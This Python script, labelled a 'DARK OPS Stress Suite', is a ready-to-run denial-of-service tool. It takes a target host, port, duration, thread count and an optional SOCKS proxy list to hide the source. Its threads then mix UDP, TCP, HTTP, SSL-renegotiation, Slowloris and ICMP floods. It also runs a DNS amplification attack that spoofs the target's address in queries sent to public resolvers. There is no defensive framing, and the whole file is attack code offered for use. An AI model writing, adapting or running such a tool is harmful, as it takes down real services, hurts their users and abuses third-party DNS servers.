import socket
import socks
import ssl
import threading
import time
import random
import sys
import requests
from scapy.all import IP, ICMP, DNS, DNSQR, UDP, send

# --- Config ---
target_ip = input("Target IP/Host: ")
target_port = int(input("Target Port: "))
duration = int(input("Duration (seconds): "))
threads = int(input("Threads: "))
use_ssl = input("Use SSL (HTTPS)? (y/n): ").lower() == 'y'
use_proxies = input("Use Proxies? (y/n): ").lower() == 'y'

proxies = []
if use_proxies:
    proxy_file = input("Proxy List File (ip:port format): ")
    with open(proxy_file, "r") as file:
        proxies = [line.strip() for line in file.readlines()]
    print(f"{len(proxies)} proxies loaded.")

http_payloads = [
    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: DarkOps/1.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
    "POST /login HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: DarkOps/1.0\r\n\r\n",
    "GET /index.html HTTP/1.0\r\nHost: {}\r\nUser-Agent: DarkOps/1.0\r\n\r\n"
]

dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]

end_time = time.time() + duration

def get_random_proxy():
    proxy = random.choice(proxies)
    ip, port = proxy.split(":")
    return ip, int(port)

def dynamic_attack():
    while time.time() < end_time:
        attack_type = random.choice(['udp', 'tcp', 'http', 'ssl', 'slowloris', 'icmp', 'dns'])
        if attack_type == 'udp':
            udp_flood()
        elif attack_type == 'tcp':
            tcp_syn_flood()
        elif attack_type == 'http':
            http_flood()
        elif attack_type == 'ssl':
            ssl_renegotiation_flood()
        elif attack_type == 'slowloris':
            slowloris()
        elif attack_type == 'icmp':
            icmp_flood()
        elif attack_type == 'dns':
            dns_amplification()

# UDP Flood
def udp_flood():
    try:
        if use_proxies:
            ip, port = get_random_proxy()
            client = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            client.set_proxy(socks.SOCKS5, ip, port)
        else:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(random.randint(512, 2048))
        while time.time() < end_time:
            client.sendto(payload, (target_ip, target_port))
    except:
        pass

# TCP SYN Flood
def tcp_syn_flood():
    try:
        if use_proxies:
            ip, port = get_random_proxy()
            client = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            client.set_proxy(socks.SOCKS5, ip, port)
        else:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        while time.time() < end_time:
            client.send(random._urandom(1024))
    except:
        pass

# HTTP Flood
def http_flood():
    try:
        if use_proxies:
            ip, port = get_random_proxy()
            client = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            client.set_proxy(socks.SOCKS5, ip, port)
        else:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        if use_ssl:
            context = ssl.create_default_context()
            client = context.wrap_socket(client, server_hostname=target_ip)
        payload = random.choice(http_payloads).format(target_ip).encode()
        while time.time() < end_time:
            client.send(payload)
            payload = random.choice(http_payloads).format(target_ip).encode()
    except:
        pass

# SSL Renegotiation Flood
def ssl_renegotiation_flood():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        context = ssl.create_default_context()
        ssl_client = context.wrap_socket(client, server_hostname=target_ip)
        while time.time() < end_time:
            ssl_client.do_handshake()
    except:
        pass

# Slowloris Attack
def slowloris():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        if use_ssl:
            context = ssl.create_default_context()
            client = context.wrap_socket(client, server_hostname=target_ip)
        while time.time() < end_time:
            client.send(b"X-a: b\r\n")
            time.sleep(15)  # Very slow header drip
    except:
        pass

# ICMP Ping Flood
def icmp_flood():
    try:
        while time.time() < end_time:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0)
    except:
        pass

# DNS Amplification Attack
def dns_amplification():
    try:
        dns_ip = random.choice(dns_servers)
        fake_query = DNS(rd=1, qd=DNSQR(qname="example.com"))
        packet = IP(dst=dns_ip, src=target_ip)/UDP(dport=53)/fake_query
        while time.time() < end_time:
            send(packet, verbose=0)
    except:
        pass

# Launcher
def start():
    print(f"Starting DARK OPS Stress Suite on {target_ip}:{target_port} with {threads} threads")
    for _ in range(threads):
        threading.Thread(target=dynamic_attack).start()

start()